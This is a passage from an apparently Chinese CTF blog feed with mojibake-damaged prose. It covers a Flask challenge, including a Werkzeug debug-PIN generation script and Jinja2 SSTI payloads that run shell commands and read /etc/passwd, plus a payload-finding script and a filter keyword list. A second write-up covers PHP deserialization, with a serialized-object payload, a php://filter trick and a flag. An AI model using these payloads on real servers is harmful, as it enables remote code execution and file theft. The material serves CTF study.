<span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485410422305&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå‡ºæ¥çš„PIN åœ¨æŠ¥é”™é¡µé¢ç‚¹å‡»å³é¢çš„terminalå›¾æ ‡è¾“å…¥è¿›å»å°±å¥½å•¦ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„‰å¿«çš„å‘½ä»¤æ‰§è¡Œäº†~</p><img src="http://cdn.polowong.top/static/images/bypass5.jpg"><p>finished.</p><h3 id="ç¬¬äºŒç§åšæ³•"><a href="#ç¬¬äºŒç§åšæ³•" class="headerlink" title="ç¬¬äºŒç§åšæ³•"></a>ç¬¬äºŒç§åšæ³•</h3><p>æ—¢ç„¶çŸ¥é“äº†æ˜¯SSTI,WHY NOT RCE DIRECTLY!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;ls &#x2F;&quot;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;sort &#x2F;this_is_the_fla\g.txt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé˜²æ­¢å¯¹catæœ‰è¿‡æ»¤ ç›´æ¥ç”¨çš„sortã€‚å·²ç»çŸ¥é“çš„è¿‡æ»¤æ˜¯popenï¼Œimportï¼Œflagã€‚osä¸çŸ¥é“ï¼Œæ‡’å¾—æµ‹è¯•äº† ç›´æ¥ç»•è¿‡</p><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>è¿™é‡Œæˆ‘å†™äº†å‡ ç§è‡ªå·±ç ”ç©¶å’Œç½‘ä¸Šå­¦ä¹ åˆ°çš„payload</p><img src="http://cdn.polowong.top/static/images/bypass1.jpg"><img src="http://cdn.polowong.top/static/images/bypass2.jpg"><p>å¼•ç”¨èµ„æºï¼š<br><strong>dict</strong> ä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸<br><strong>class</strong>  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡<br><strong>mro</strong>    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚<br><strong>bases</strong>   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»<br>// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„</p><p><strong>subclasses</strong>   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨<br><strong>init</strong>  ç±»çš„åˆå§‹åŒ–æ–¹æ³•<br><strong>globals</strong>  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨<br>æˆ‘æ€è€ƒçš„ï¼š<br>__builtins__é‡Œé¢åŒ…æ‹¬äº†ä¸€äº›ç›´æ¥æ‹¿æ¥ç”¨çš„æ–¹æ³• æ¯”å¦‚è¯´hex openç­‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python3:</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#å‘½ä»¤æ‰§è¡Œï¼š</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#æ–‡ä»¶æ“ä½œ</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; è¿™ç§ä¸ç”¨æ‰¾ç±»</span><br><span class="line"></span><br><span class="line">å½“ç„¶äº† ä¸‡èƒ½çš„å®é™…ç”¨èµ·æ¥å¯èƒ½å¹¶ä¸èƒ½ã€‚ã€‚å› ä¸ºä¸€èˆ¬ä¼šè¿‡æ»¤ æ¯”å¦‚è¿™é“é¢˜çš„<span class="keyword">import</span> å’Œ popenéƒ½è¿‡æ»¤äº†ï¼ŒRCEçš„æ—¶å€™ä¸‡é‡‘æ²¹ä¸å¤ªè¡Œäº†ï¼</span><br><span class="line">python2:</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;  </span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SSTIå…³é”®è¯ï¼ˆé˜²æŠ¤ç”¨ï¼‰</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">(</span><br><span class="line">\</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">_</span><br><span class="line">__</span><br><span class="line">.</span><br><span class="line">g</span><br><span class="line">&#39;&#39;</span><br><span class="line">&quot;&quot;</span><br><span class="line">request</span><br><span class="line">g</span><br><span class="line">namespace</span><br><span class="line">__dict__</span><br><span class="line">__class__</span><br><span class="line">__mro__</span><br><span class="line">__bases__</span><br><span class="line">__subclasses__</span><br><span class="line">__init__</span><br><span class="line">__globals__</span><br><span class="line">self</span><br><span class="line">config</span><br><span class="line">url_for</span><br><span class="line">get_flashed_messages</span><br><span class="line">lipsum</span><br><span class="line">current_app</span><br><span class="line">range</span><br><span class="line">session</span><br><span class="line">dict</span><br><span class="line">get_flashed_messages</span><br><span class="line">cycler</span><br><span class="line">joiner</span><br><span class="line">__builtins__</span><br><span class="line">__import__</span><br><span class="line">eval</span><br><span class="line">keys</span><br><span class="line">index</span><br><span class="line">values</span><br><span class="line">popen</span><br><span class="line">read</span><br><span class="line">_TemplateReference__context</span><br><span class="line">environ</span><br><span class="line">application</span><br><span class="line">_get_data_for_json</span><br><span class="line">JSONEncoder</span><br><span class="line">default</span><br><span class="line">system</span><br><span class="line">flag</span><br><span class="line">*</span><br><span class="line">?</span><br><span class="line">import</span><br><span class="line">_IterationGuard</span><br><span class="line">catch_warnings</span><br><span class="line">_ModuleLock</span><br><span class="line">flag</span><br><span class="line">chr</span><br><span class="line">subprocess</span><br><span class="line">commands</span><br><span class="line">socket</span><br><span class="line">hex</span><br><span class="line">base64</span><br></pre></td></tr></table></figure><p>æ‰¾æ¨¡å—è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">import</span>  numpy</span><br><span class="line">choice=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;æ‰¾os1 å…¶ä»–0&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> choice==<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> [].__class__.__mro__[<span class="number">1</span>].__subclasses__():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">             <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">                 <span class="built_in">print</span>(num)</span><br><span class="line">                 <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line">             num+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    searchList = [<span class="string">&#x27;__init__&#x27;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&#x27;__del__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__bytes__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__bool__&#x27;</span>, <span class="string">&#x27;__getattr__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__set__&#x27;</span>, <span class="string">&#x27;__delete__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&quot;__instancecheck__&quot;</span>, <span class="string">&#x27;__subclasscheck__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__length_hint__&#x27;</span>, <span class="string">&#x27;__missing__&#x27;</span>,<span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>,<span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__reversed__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__add__&#x27;</span>, <span class="string">&#x27;__sub__&#x27;</span>,<span class="string">&#x27;__mul__&#x27;</span>]</span><br><span class="line">    neededFunction = [<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    pay = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Payload?[1|0]&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> index, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(&#123;&#125;.__class__.__base__.__subclasses__()):</span><br><span class="line">        <span class="keyword">for</span> attr <span class="keyword">in</span> searchList:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(i, attr):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;str(i.&#x27;</span>+attr+<span class="string">&#x27;)[1:9]&#x27;</span>) == <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line">                    <span class="keyword">for</span> goal <span class="keyword">in</span> neededFunction:</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">eval</span>(<span class="string">&#x27;&quot;&#x27;</span>+goal+<span class="string">&#x27;&quot; in i.&#x27;</span>+attr+<span class="string">&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;</span>)):</span><br><span class="line">                            <span class="keyword">if</span> pay != <span class="number">1</span>:</span><br><span class="line">                                <span class="built_in">print</span>(index,i.__name__,<span class="string">&quot;:&quot;</span>, attr, goal)</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot;</span> + i.__name__ + <span class="string">&quot;&#x27; %&#125;&#123;&#123; c.&quot;</span> + attr + <span class="string">&quot;.__globals__[&#x27;__builtins__&#x27;].&quot;</span> + goal + <span class="string">&quot;(\&quot;[evil]\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯web-ååºåˆ—åŒ–,java</title>
      <link href="2020/05/15/%E7%BD%91%E9%BC%8E%E6%9D%AFweb-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2020/05/15/%E7%BD%91%E9%BC%8E%E6%9D%AFweb-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><h2 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é˜…è¯»æºç åå¯ä»¥å‘ç°ï¼Œè¿™é“é¢˜è¿‡æ»¤çš„å†…å®¹æ¯”è¾ƒå°‘ï¼Œç›¸å¯¹ç®€å•ï¼Œä½†æ˜¯æˆ‘ä¸€å¼€å§‹è¿˜æ˜¯æ²¡åšå‡ºæ¥ï¼Œèœã€‚<br>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨php7.1+ç‰¹æ€§ï¼Œå¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°æ„é€ çš„æ—¶å€™æŠŠprotectedæ¢æˆpublicæ„é€ å³å¯ã€‚<br>O:11:â€FileHandlerâ€:3:{s:2:â€opâ€;i:2;s:8:â€filenameâ€;s:8:â€flag.phpâ€;s:7:â€contentâ€;s:1:â€tâ€;}<br>å³é”®æŸ¥çœ‹æºç å³å¯ã€‚<br>æ–¹æ³•äºŒï¼šåœ¨åˆ©ç”¨php7.1+ç‰¹æ€§çš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨phpä¼ªåè®®ï¼Œphp://filter/convert.base64-encode/resource=flag.phpè·å–flag.phpæ–‡ä»¶å†…å®¹ã€‚<br>å¾—åˆ°å†…å®¹ä¸ºPD9waHAgJGZsYWc9J2ZsYWd7YzI0NmJmMzEtOGM3Zi00M2FhLTliY2QtMGY2NDVlNTk2NWQxfSc7Cg==<br>ç„¶åbase64è§£ç å³å¯ã€‚<br>&lt;?php $flag=â€™flag{c246bf31-8c7f-43aa-9bcd-0f645e5965d1}â€™;</p><h1 id="java-file"><a 